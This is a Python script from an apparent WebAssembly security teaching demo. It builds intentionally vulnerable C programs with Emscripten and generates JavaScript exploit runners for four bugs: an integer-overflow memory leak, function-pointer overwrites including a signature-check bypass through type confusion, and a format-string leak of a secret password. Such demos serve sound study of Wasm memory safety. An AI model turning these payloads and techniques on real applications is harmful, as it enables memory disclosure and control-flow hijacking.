# coding=utf-8

EXPLOITS = {
    "integer_overflow": {
        "description": "integer overflow vulnerability that allows a malicious user to leak memory from adjacent variables (vulnerability bolded)",
        "c_code_path" : 'c/integer_overflow.c',
        "exploit_code": '''
            var result = binary.ccall('buffer_overread', 'None', ['number','number'], [256, 270]);
        '''
    },
    "redirection_hijack": {
        
        "description": '''Wasm does not protect against overwriting function pointers. As a mitigation against function pointer overwrites, Wasm checks the signature of the called function when making an indirect function call, and checks that the signature matches what is expected. The function signature is made up of the number and types of arguments to the function. This means that an exploit cannot transfer execution to a function having the wrong signature.''',
        "c_code_path" : 'c/redirection.c',
        "exploit_code": '''
            var result = binary.ccall('func_ptr_overwrite', 'None', ['string'], ["AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6"]);
        '''
    },
    "redirection_different_signature": {
        
        "description": '''Unfortunately, the function signature check is not a water-proof way of mitigating against function pointer
                        overwrites. For example, when the C (or other language) datatypes are converted to the corresponding
                        Wasm datatypes, type confusion can occur, which can let us bypass the function signature check.
                        For example, a C void pointer (void *) and an integer (int) both translate to the i32 datatype in Wasm.
                        This issue is not limited to lower-level languages such as C.

                        This can be taken even further. If you use Emscripten for compiling to Wasm, control-flow can be
                        handled using a function named emscripten_set_main_loop_arg(). This function only takes two
                        pointers: one pointer to the function to execute and another pointer to the arguments. Notice that even if
                        the function to execute takes several arguments, there is still just one pointer, so in that case it needs to
                        point to a struct or similar. When having only two pointers, the function signature check is going to match
                        for all functions. We may be able to overwrite both the function pointer and the arguments without Wasm
                        bailing out.
                        Note that the functions technically took the same parameter, a pointer, but they were different in the sense
                        that the structs they pointed to are interpreted differently.
''',
        "c_code_path" : 'c/redirection_different_signature.c',
        "exploit_code": '''
            // var normal = binary.ccall('func_ptr_overwrite2', 'None', ['string', 'string'], ["Bob", "22"]); // Normal behavior
            var exploit = binary.ccall('func_ptr_overwrite2', 'None', ['string', 'string'], ["2Ferrari                %07", "22"]); // Exploit
        '''
    },
    "format_string_bug": {
        
        "description": '''You used to be able to get arbitrary code execution with format string bugs via the ‘%n’ modifier.
                        Nowadays you typically only get information disclosure since many C compilers disallow the use of the
                        %n modifier because of its security implications. The situation is the same with Wasm – it doesn’t
                        appear to be possible to get arbitrary code execution, but information disclosure is indeed possible.
                        Below we have a very simple function that has a vulnerable call to the printf() function (marked in
                        bold). By entering a suitable input, we can leak out the value of the variable ‘secret_password’: 0000 4050794d3077737321216472 0001398000000000. 

                        Transforming the output (0000 4050794d3077737321216472 0001398000000000) with ' echo -n 4050794d3077737321216472 | xxd -r -p|od --endian=little -t x|head -
1|xxd -r && echo' we will get the leaked information
''',
        "c_code_path" : 'c/format_string_bug.c',
        "exploit_code": '''
            var exploit = binary.ccall('format_string_bug', 'None', ['string'], ["%x%x%x%x %x%x%x %x%x%x%x%x%x%x%x%x%x%x%x%x"]); // Exploit
        '''
    }
}


OUT_DIR = 'out' 

import sys
import os
import shutil
from subprocess import Popen, PIPE

def generate(id):
    if not id in EXPLOITS:
        print("Not valid exploit id. Exiting...")
        exit(1)

    print(id)

    if not os.path.exists(OUT_DIR):
        os.mkdir(OUT_DIR)
    else:
        shutil.rmtree(OUT_DIR)
        os.mkdir(OUT_DIR)

    p = Popen(["bash", "compile.sh", EXPLOITS[id]["c_code_path"]])
    output, err = p.communicate()

    if output or err:
        print(output, err)

    # PATCH !!!

    shutil.move("a.out.wasm", "%s/%s.wasm"%(OUT_DIR, id))

    content = open("a.out.js", 'r').read().replace("a.out.wasm", "%s.wasm"%(id))
    outJS = open("%s/%s.js"%(OUT_DIR, id), 'wb')
    outJS.write(content)
    outJS.close()

    os.remove("a.out.js")

    #=================
    f = open("%s/exploit.js"%(OUT_DIR), 'w')

    f.write('''
const binary = require("{bin_out}")

binary.onRuntimeInitialized = function() {{

    {exploit}
}}
'''.format(exploit = EXPLOITS[id]["exploit_code"], bin_out="./%s.js"%(id, )))

    f.close()

    print("Execute the exploit...", "node %s/exploit.js"%(OUT_DIR,))

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("You must provide a exploit to be compiled. Available options:\n")
        for k, value in EXPLOITS.items():
            print("\t ID:" + k + "\n")
            print("\t DESCRIPTION:" + value["description"])
            print("==========================================================")

        exit(1)
    id = sys.argv[1]

    generate(id)